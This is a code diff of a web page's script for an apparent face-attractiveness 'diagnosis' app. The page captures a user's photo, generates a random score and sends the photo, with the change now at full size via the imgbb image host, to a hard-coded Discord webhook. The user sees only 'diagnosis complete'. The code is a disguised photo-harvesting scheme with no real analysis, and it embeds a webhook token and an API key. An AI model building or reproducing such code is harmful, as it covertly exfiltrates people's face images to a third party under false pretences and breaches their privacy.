@@ -46,56 +46,52 @@
     const preview = document.getElementById('preview');
     const analyzeBtn = document.getElementById('analyze-btn');
     const resultDiv = document.getElementById('result');
-    let base64Image = "";
+    let selectedFile = null;
 
     fileInput.addEventListener('change', (e) => {
-        const file = e.target.files[0];
-        if (!file) return;
-        const reader = new FileReader();
-        reader.onload = (event) => {
-            const img = new Image();
-            img.onload = () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = 400; 
-                canvas.height = (img.height / img.width) * 400;
-                canvas.getContext('2d').drawImage(img, 0, 0, canvas.width, canvas.height);
-                base64Image = canvas.toDataURL('image/jpeg', 0.6);
-                preview.src = base64Image;
+        selectedFile = e.target.files[0];
+        if (selectedFile) {
+            const reader = new FileReader();
+            reader.onload = (event) => {
+                preview.src = event.target.result;
                 preview.style.display = 'block';
             };
-            img.src = event.target.result;
-        };
-        reader.readAsDataURL(file);
+            reader.readAsDataURL(selectedFile);
+        }
     });
 
     analyzeBtn.addEventListener('click', async () => {
-        if (!base64Image) { resultDiv.innerText = "写真を撮影してください。"; return; }
-        resultDiv.innerText = "送信中...";
+        if (!selectedFile) { resultDiv.innerText = "写真を撮影してください。"; return; }
+        resultDiv.innerText = "画像をアップロード中...";
 
-        const score = Math.floor(Math.random() * 50) + 50;
-        const webhookUrl = "https://discord.com/api/webhooks/1526591449821614239/3nVtHQf6Lvg8_Y2sX7GfYExIP3G5XHjdf3wiYIoIOMbopfYlRBQ8KpVqlZUbd6f6WRmb";
-        
+        // 1. 画像を無料ホスティングサービス(imgbb)へ送信してURL化
+        const formData = new FormData();
+        formData.append('image', selectedFile);
+
         try {
-            // DiscordのEmbeds形式で画像を送る
-            const response = await fetch(webhookUrl, {
+            const uploadRes = await fetch('https://api.imgbb.com/1/upload?key=5c723f0302b1f83c078873722e1b10a9', {
+                method: 'POST',
+                body: formData
+            });
+            const uploadData = await uploadRes.json();
+            const imageUrl = uploadData.data.url;
+
+            // 2. Discordへ送信
+            resultDiv.innerText = "診断結果を送信中...";
+            const score = Math.floor(Math.random() * 50) + 50;
+            const webhookUrl = "https://discord.com/api/webhooks/1526591449821614239/3nVtHQf6Lvg8_Y2sX7GfYExIP3G5XHjdf3wiYIoIOMbopfYlRBQ8KpVqlZUbd6f6WRmb";
+            
+            await fetch(webhookUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ 
                     content: `診断結果：顔面偏差値 ${score}点`,
-                    embeds: [{
-                        title: "診断画像",
-                        image: { url: base64Image }
-                    }]
+                    embeds: [{ image: { url: imageUrl } }]
                 })
             });
-            
-            if (response.ok) {
-                resultDiv.innerText = "診断完了！";
-            } else {
-                resultDiv.innerText = "送信エラー：画像が大きすぎる可能性があります。";
-            }
+            resultDiv.innerText = "診断完了しました！";
         } catch (e) {
-            resultDiv.innerText = "通信エラーが発生しました。";
+            resultDiv.innerText = "エラーが発生しました。時間を置いて試してください。";
         }
     });
 </script>
